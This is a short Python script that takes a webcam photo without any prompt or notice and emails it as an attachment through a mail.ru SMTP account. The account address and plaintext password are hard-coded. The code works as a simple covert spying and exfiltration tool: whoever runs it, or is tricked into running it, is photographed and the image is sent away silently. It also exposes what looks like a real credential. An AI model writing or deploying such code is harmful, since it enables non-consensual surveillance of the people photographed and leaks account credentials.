import smtplib
from email import encoders
import cv2
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from platform import python_version


def sendmain():
    server = 'smtp.mail.ru'
    user = 'venigret90@mail.ru'
    password = 'y8pbcrbbZxQuSzwAhgin'

    recepient = 'venigret90@mail.ru'
    sender = 'venigret90@mail.ru'
    subject = "Tema SMS"
    text = "Text of the message"

    filepath = "photo.png"
    basename = os.path.basename(filepath)
    filesize = os.path.getsize(filepath)

    msg = MIMEMultipart('alternative')
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = recepient
    msg['Reply-To'] = sender
    msg['Return-Path'] = recepient
    msg['X-Mailer'] = 'Python/' + (python_version())

    part_text = MIMEText(text, 'plain')
    part_file = MIMEBase('application', 'octet-stream; name="{}"'.format(basename))
    part_file.set_payload(open(filepath, 'rb').read())
    part_file.add_header('Content-Disposition', basename)
    part_file.add_header('Content-Disposition', 'attachment ; filename="{}"; size={}'.format(basename, filesize))
    encoders.encode_base64(part_file)

    msg.attach(part_text)
    msg.attach(part_file)

    mail = smtplib.SMTP_SSL(server)
    mail.login(user, password)
    mail.sendmail(sender, recepient, msg.as_string())
    mail.quit()


def scrin():
    cap = cv2.VideoCapture(0)
    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
    ret, frame = cap.read()
    cv2.imwrite('photo.png', frame)
    cap.release()


scrin()
sendmain()
